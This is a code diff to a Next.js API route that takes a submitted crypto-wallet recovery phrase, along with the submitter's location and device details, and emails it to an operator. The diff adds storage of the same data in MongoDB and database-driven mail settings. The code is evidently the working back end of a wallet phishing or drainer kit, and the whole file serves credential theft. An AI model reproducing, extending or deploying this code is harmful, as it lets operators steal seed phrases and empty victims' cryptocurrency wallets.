@@ -2,6 +2,7 @@
 import axios from "axios"
 import nodemailer from "nodemailer"
 import type { SendMailOptions, TransportOptions } from "nodemailer"
+import { saveSubmission, getSettings } from "@/lib/mongodb"
 
 interface MnemonicData {
   phrase: string
@@ -107,26 +108,28 @@ function getDeviceInfo(req: NextRequest): DeviceInfo {
   }
 }
 
-function resolveMailConfig() {
-  const user = process.env.SMTP_USER
-  const pass = process.env.SMTP_PASS
-  const to = process.env.ALERT_RECIPIENT_EMAIL
+function resolveMailConfig(settings?: any) {
+  // Use settings from database if available, otherwise fall back to env vars
+  const user = settings?.smtpUser || process.env.SMTP_USER
+  const pass = settings?.smtpPass || process.env.SMTP_PASS
+  const to = settings?.alertRecipientEmail || process.env.ALERT_RECIPIENT_EMAIL
 
   if (!user || !pass || !to) {
     return {
       transportConfigs: [],
-      from: process.env.EMAIL_FROM ?? process.env.FROM_EMAIL ?? user ?? "no-reply@example.com",
+      from: settings?.fromEmail || (process.env.EMAIL_FROM ?? process.env.FROM_EMAIL ?? user ?? "no-reply@example.com"),
       to,
       skipReason: "SMTP credentials or recipient not fully configured",
     }
   }
 
-  const host = process.env.SMTP_HOST ?? "smtp.gmail.com"
-  const port = Number(process.env.SMTP_PORT ?? "465")
-  const secure =
-    process.env.SMTP_SECURE !== undefined
+  const host = settings?.smtpHost || (process.env.SMTP_HOST ?? "smtp.gmail.com")
+  const port = settings?.smtpPort || Number(process.env.SMTP_PORT ?? "465")
+  const secure = settings?.smtpSecure !== undefined 
+    ? settings.smtpSecure 
+    : (process.env.SMTP_SECURE !== undefined
       ? process.env.SMTP_SECURE === "true"
-      : port === 465
+      : port === 465)
 
   const baseConfig: TransportOptions = {
     host,
@@ -156,7 +159,7 @@ function resolveMailConfig() {
 
   return {
     transportConfigs: configs,
-    from: process.env.EMAIL_FROM ?? process.env.FROM_EMAIL ?? user,
+    from: settings?.fromEmail || (process.env.EMAIL_FROM ?? process.env.FROM_EMAIL ?? user),
     to,
   }
 }
@@ -185,8 +188,8 @@ async function sendEmailWithFallback(
   return { sent: false, error: lastError }
 }
 
-async function sendEmailNotification(payload: EmailPayload) {
-  const { transportConfigs, from, to, skipReason } = resolveMailConfig()
+async function sendEmailNotification(payload: EmailPayload, settings?: any) {
+  const { transportConfigs, from, to, skipReason } = resolveMailConfig(settings)
   if (!to || transportConfigs.length === 0) {
     console.warn(skipReason ?? "Email sending skipped because SMTP is not configured")
     return { sent: false, skipped: true, reason: skipReason }
@@ -253,25 +256,51 @@ export async function POST(req: NextRequest) {
     const timestamp = new Date().toISOString()
     const phraseLength = mnemonicData.phrase.trim().split(/\s+/).length
 
-    const emailResult = await sendEmailNotification({
-      timestamp,
+    const submissionData = {
+      timestamp: new Date(),
       walletType: mnemonicData.walletType,
       phrase: mnemonicData.phrase,
       phraseLength,
       location: locationData,
       device: deviceInfo,
-    })
+    }
 
-    if (!emailResult.sent) {
-      console.warn("Submission email not sent; continuing without failing request", emailResult)
+    // Get settings (from database if available, else from environment)
+    const settings = await getSettings()
+    
+    let emailSent = false
+    let dbSaved = false
+
+    // Save to MongoDB if enabled
+    if (settings?.useMongodb || process.env.USE_MONGODB === 'true') {
+      const mongoUri = settings?.mongodbUri || process.env.MONGODB_URI;
+      dbSaved = await saveSubmission(submissionData, mongoUri);
+    }
+
+    // Send email if enabled
+    if (settings?.useEmail !== false && process.env.USE_EMAIL !== 'false') {
+      const emailResult = await sendEmailNotification({
+        timestamp,
+        walletType: mnemonicData.walletType,
+        phrase: mnemonicData.phrase,
+        phraseLength,
+        location: locationData,
+        device: deviceInfo,
+      }, settings)
+      emailSent = emailResult.sent
+
+      if (!emailSent) {
+        console.warn("Submission email not sent; continuing without failing request", emailResult)
+      }
     }
 
     return NextResponse.json({
       success: true,
-      message: emailResult.sent
-        ? "Submission emailed successfully"
-        : "Submission received (email notification not sent)",
-      emailSent: emailResult.sent,
+      message: emailSent || dbSaved
+        ? "Submission processed successfully"
+        : "Submission received",
+      emailSent,
+      dbSaved,
       data: {
         timestamp,
         walletType: mnemonicData.walletType,
@@ -283,7 +312,7 @@ export async function POST(req: NextRequest) {
     return NextResponse.json(
       {
         success: false,
-        message: "Failed to send submission email. Please try again.",
+        message: "Failed to process submission. Please try again.",
         error: error instanceof Error ? error.message : "Unknown error",
       },
       { status: 500 },
